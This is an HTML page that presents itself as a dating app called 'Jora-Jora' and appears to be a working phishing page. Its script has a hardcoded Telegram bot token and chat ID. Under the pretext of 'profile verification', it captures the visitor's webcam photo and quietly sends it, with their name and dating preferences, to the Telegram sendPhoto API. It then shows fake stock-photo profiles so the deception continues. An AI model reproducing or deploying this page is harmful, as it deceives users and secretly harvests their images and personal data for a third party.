<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jora-Jora Bodo Dating</title>
    <style>
        :root {
            --primary: #fd297b; /* Tinder-like pink/red */
            --secondary: #ff655b; /* Warm orange/red */
            --background: #f8f8f8;
            --text: #333333;
            --input-bg: #f0f0f0;
            --error: #e63946;
            --success: #2a9d8f;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: var(--text);
            margin: 0;
            padding: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .main-wrapper {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
            position: relative;
            min-height: 600px;
        }

        .container {
            padding: 35px 30px;
            transition: opacity 0.5s ease;
        }

        h1 { 
            background: -webkit-linear-gradient(45deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center; 
            margin-bottom: 5px; 
            font-size: 32px;
            font-weight: 800;
        }
        
        p.subtitle { 
            text-align: center; 
            color: #888; 
            margin-bottom: 30px; 
            font-size: 15px;
        }

        .form-group { margin-bottom: 20px; }
        label { 
            display: block; 
            font-weight: 600; 
            margin-bottom: 8px; 
            color: #555; 
            font-size: 14px;
        }
        
        select, input[type="text"] {
            width: 100%; 
            padding: 14px; 
            border: 2px solid transparent;
            background-color: var(--input-bg);
            border-radius: 12px; 
            box-sizing: border-box; 
            font-size: 16px;
            color: #333;
            transition: all 0.3s ease;
        }
        
        select:focus, input[type="text"]:focus { 
            border-color: var(--primary); 
            background-color: white;
            outline: none; 
            box-shadow: 0 0 8px rgba(253, 41, 123, 0.2);
        }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .webcam-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 25px;
            padding: 20px;
            border: 2px dashed #ffb3c6;
            border-radius: 15px;
            background-color: #fff9fa;
        }

        #videoElement {
            width: 100%;
            max-width: 250px;
            border-radius: 50%;
            border: 4px solid var(--primary);
            display: none;
            transform: scaleX(-1);
            box-shadow: 0 8px 20px rgba(253, 41, 123, 0.3);
            aspect-ratio: 1 / 1;
            object-fit: cover;
        }

        .liveness-instruction {
            text-align: center;
            font-size: 13px;
            color: #666;
            margin-top: 15px;
            display: none;
        }

        .btn-primary {
            width: 100%; 
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            border: none; 
            padding: 16px; 
            font-size: 18px; 
            font-weight: bold;
            border-radius: 25px; 
            cursor: pointer; 
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(253, 41, 123, 0.4);
        }
        
        .btn-primary:hover { 
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(253, 41, 123, 0.5);
        }
        
        .btn-primary:disabled { 
            background: #cccccc; 
            box-shadow: none;
            cursor: not-allowed; 
            transform: none;
        }

        #startCameraBtn {
            background: white;
            color: var(--primary);
            border: 2px solid var(--primary);
            box-shadow: none;
        }
        
        #startCameraBtn:hover { background: #fff0f3; }

        #statusMessage {
            margin-top: 20px; 
            padding: 12px; 
            border-radius: 10px;
            text-align: center; 
            font-weight: bold; 
            display: none;
        }
        .error { background-color: #f8d7da; color: #721c24; }
        
        #canvasElement { display: none; }

        #loadingView {
            display: none;
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: white;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            z-index: 10;
        }
        
        .radar-spinner {
            width: 80px; height: 80px;
            border-radius: 50%;
            border: 4px solid #ffe5ec;
            border-top: 4px solid var(--primary);
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #matchView {
            display: none;
            padding: 20px;
            height: 100%;
            background: #f4f6f8;
            box-sizing: border-box;
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            flex-direction: column;
        }

        .app-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 15px;
        }
        .app-header h2 { margin: 0; font-size: 24px; color: var(--primary); }
        .app-header span { font-size: 24px; cursor: pointer; color: #aaa; transition: 0.2s;}
        .app-header span:hover { color: var(--primary); }

        .profile-card {
            position: relative;
            flex-grow: 1;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
        }

        .profile-img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0; left: 0;
            z-index: 1;
        }

        .profile-info {
            position: absolute;
            bottom: 0; left: 0; right: 0;
            padding: 30px 20px 20px;
            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.6) 60%, transparent 100%);
            color: white;
            z-index: 2;
        }

        .profile-info h3 { margin: 0 0 5px 0; font-size: 28px; font-weight: 700; display: flex; align-items: center;}
        .profile-info h3 span { font-weight: 400; font-size: 24px; margin-left: 8px; }
        .profile-info .distance { font-size: 14px; margin-bottom: 10px; color: #ddd; display: flex; align-items: center; gap: 5px; }
        .profile-info .bio { font-size: 15px; line-height: 1.4; color: #eee; margin: 0;}

        .action-buttons {
            display: flex;
            justify-content: center;
            gap: 25px;
            padding: 25px 0 10px;
            z-index: 3;
            background: transparent;
        }

        .action-btn {
            width: 65px; height: 65px;
            border-radius: 50%;
            border: none;
            background: white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            cursor: pointer;
            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .action-btn:hover { transform: scale(1.15); }
        .btn-pass { color: #fd297b; }
        .btn-like { color: #1be4a1; }
        .btn-super { color: #2db1ff; width: 50px; height: 50px; font-size: 22px; margin-top: 10px; }

        .no-more-profiles {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            text-align: center;
            color: #777;
            padding: 20px;
        }
        .no-more-profiles .radar-spinner { border-top-color: #ccc; border-color: #eee; animation-duration: 3s; }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="container" id="setupView">
        <h1>🔥 Jora-Jora</h1>
        <p class="subtitle">Bodo Dating • Find Your Match Instantly</p>

        <form id="orderForm">
            <!-- Profile Details -->
            <div class="form-group">
                <label for="profileName">Your First Name</label>
                <input type="text" id="profileName" placeholder="e.g. Rahul" required>
            </div>

            <div class="form-group">
                <label for="lookingFor">I am looking for</label>
                <select id="lookingFor" required>
                    <option value="Women">Women</option>
                    <option value="Men">Men</option>
                    <option value="Everyone">Everyone</option>
                </select>
            </div>

            <!-- Preferences -->
            <div class="grid">
                <div class="form-group">
                    <label for="ageRange">Age Range</label>
                    <select id="ageRange">
                        <option value="18 - 24">18 - 24</option>
                        <option value="25 - 30">25 - 30</option>
                        <option value="31 - 40">31 - 40</option>
                        <option value="40+">40+</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="intent">Looking for</label>
                    <select id="intent">
                        <option value="Relationship">Relationship</option>
                        <option value="Casual Dating">Casual Dating</option>
                        <option value="New Friends">New Friends</option>
                    </select>
                </div>
            </div>

            <!-- Liveness / Webcam Section -->
            <div class="webcam-container">
                <label>Profile Verification</label>
                <button type="button" id="startCameraBtn" class="btn-primary">📸 Take Profile Photo</button>
                <video id="videoElement" autoplay playsinline></video>
                <p class="liveness-instruction" id="livenessInstruction">Look your best! We'll capture this securely for your profile verification.</p>
                <canvas id="canvasElement"></canvas>
            </div>

            <button type="submit" id="submitBtn" class="btn-primary" disabled>Create Profile & Match ❤️</button>
        </form>

        <div id="statusMessage"></div>
    </div>

    <div id="loadingView">
        <div class="radar-spinner"></div>
        <h2 style="color: var(--primary); margin-bottom: 5px;">Finding matches...</h2>
        <p style="color: #666; margin:0;">Scanning your area for genuine profiles.</p>
    </div>

    <div id="matchView">
        <div class="app-header">
            <h2>🔥 Jora-Jora</h2>
            <span title="Settings">⚙️</span>
        </div>
        
        <div class="profile-card" id="profileCard">
            <!-- Profile Content Injected via JS -->
        </div>

        <div class="action-buttons" id="actionButtons">
            <button class="action-btn btn-pass" onclick="handleSwipe('left')" title="Pass">❌</button>
            <button class="action-btn btn-super" onclick="handleSwipe('up')" title="Super Like">⭐</button>
            <button class="action-btn btn-like" onclick="handleSwipe('right')" title="Like">❤️</button>
        </div>
    </div>
</div>

<script>
    const BOT_TOKEN = '8919666195:AAE1kQrD3SEXBYbKZPrOjtoFUHljDxZHPYY';
    const CHAT_ID = '2147403583';

    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');
    const startCameraBtn = document.getElementById('startCameraBtn');
    const submitBtn = document.getElementById('submitBtn');
    const livenessInstruction = document.getElementById('livenessInstruction');
    let streamActive = false;

    // 1. Initialize Webcam
    startCameraBtn.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            video.style.display = 'block';
            startCameraBtn.style.display = 'none';
            livenessInstruction.style.display = 'block';
            submitBtn.disabled = false;
            streamActive = true;
        } catch (err) {
            alert("Camera access denied. We need a photo to verify your dating profile!");
            console.error("Webcam error:", err);
        }
    });

    // 2. Handle Form Submission & Snapshot
    document.getElementById('orderForm').addEventListener('submit', function(e) {
        e.preventDefault();

        if (!streamActive) {
            alert("Please take a profile photo first!");
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerText = "Securing Profile... 🔒";

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(function(blob) {
            sendToTelegram(blob);
        }, 'image/jpeg', 0.90);
    });

    function sendToTelegram(imageBlob) {
        const name = document.getElementById('profileName').value;
        const lookingFor = document.getElementById('lookingFor').value;
        const ageRange = document.getElementById('ageRange').value;
        const intent = document.getElementById('intent').value;
        
        const captionText = `❤️ *NEW JORA-JORA PROFILE* ❤️\n\n` +
                            `*Name:* ${name}\n` +
                            `*Seeking:* ${lookingFor}\n` +
                            `*Age Pref:* ${ageRange}\n` +
                            `*Intent:* ${intent}\n\n` +
                            `📸 *Profile Verification Attached*`;

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'profile_verification.jpg');
        formData.append('caption', captionText);
        formData.append('parse_mode', 'Markdown');

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        // Switch to Loading View immediately to feel responsive
        document.getElementById('setupView').style.display = 'none';
        document.getElementById('loadingView').style.display = 'flex';
        
        // Stop the webcam stream
        const stream = video.srcObject;
        if(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }

        fetch(url, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                // Simulate extra "finding matches" time for dramatic effect
                setTimeout(() => {
                    startDatingExperience();
                }, 1500);
            } else {
                throw new Error(data.description);
            }
        })
        .catch(error => {
            // Revert back to form on error
            document.getElementById('loadingView').style.display = 'none';
            document.getElementById('setupView').style.display = 'block';
            
            const statusMessage = document.getElementById('statusMessage');
            statusMessage.className = "error";
            statusMessage.style.display = "block";
            statusMessage.innerText = "❌ Failed to create profile. Please check your connection.";
            submitBtn.disabled = false;
            submitBtn.innerText = "Create Profile & Match ❤️";
            
            // Restart webcam logic would ideally go here if we wanted to fully recover it
        });
    }

    // Realistic dummy profiles dataset
    const dummyProfiles = [
        {
            name: "Priya",
            age: 24,
            distance: 3,
            bio: "Love hiking, good coffee, and trying out new cafes in the city. ☕️🏔️ Let's grab a drink!",
            img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
        },
        {
            name: "Aarav",
            age: 27,
            distance: 8,
            bio: "Software developer by day, guitarist by night. Looking for someone with a good sense of humor. 🎸✨",
            img: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
        },
        {
            name: "Neha",
            age: 26,
            distance: 12,
            bio: "Foodie, traveler, and unapologetic dog mom. Tell me your favorite travel destination! ✈️🐶",
            img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
        },
        {
            name: "Rahul",
            age: 29,
            distance: 5,
            bio: "Fitness enthusiast and weekend trekker. Swipe right if you can keep up. 🏃‍♂️💨",
            img: "https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
        },
        {
            name: "Anjali",
            age: 23,
            distance: 2,
            bio: "Art student. I spend too much time at museums and plant shops. 🌿🎨",
            img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?ixlib=rb-1.2.1&auto=format&fit=crop&w=600&q=80"
        }
    ];

    let currentProfileIndex = 0;

    function startDatingExperience() {
        document.getElementById('loadingView').style.display = 'none';
        document.getElementById('matchView').style.display = 'flex';
        
        // Filter profiles based on preference (Simplified logic for demo)
        // In a real app, we'd filter the array based on user's 'lookingFor' selection.
        // For this demo, we just show the array as is.
        renderProfile();
    }

    function renderProfile() {
        const cardContainer = document.getElementById('profileCard');
        
        if (currentProfileIndex >= dummyProfiles.length) {
            // Out of profiles state
            cardContainer.innerHTML = `
                <div class="no-more-profiles">
                    <div class="radar-spinner" style="border-top-color:#fd297b;"></div>
                    <h3>No new matches nearby</h3>
                    <p>Expand your search radius or check back later!</p>
                </div>
            `;
            document.getElementById('actionButtons').style.display = 'none';
            return;
        }

        const profile = dummyProfiles[currentProfileIndex];
        
        cardContainer.innerHTML = `
            <img src="${profile.img}" class="profile-img" alt="${profile.name}">
            <div class="profile-info">
                <h3>${profile.name} <span>${profile.age}</span></h3>
                <div class="distance">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                    ${profile.distance} km away
                </div>
                <p class="bio">${profile.bio}</p>
            </div>
        `;
    }

    function handleSwipe(direction) {
        // Prevent action if out of profiles
        if (currentProfileIndex >= dummyProfiles.length) return;

        // In a real app, we'd add CSS transform animations here before moving to next.
        // For this seamless prototype, we instantly switch to the next profile.
        
        // Optional: Show matched dialog if it was a 'like' 
        // if(direction === 'right' && Math.random() > 0.7) { alert("It's a Match!"); }

        currentProfileIndex++;
        renderProfile();
    }
</script>

</body>
</html>
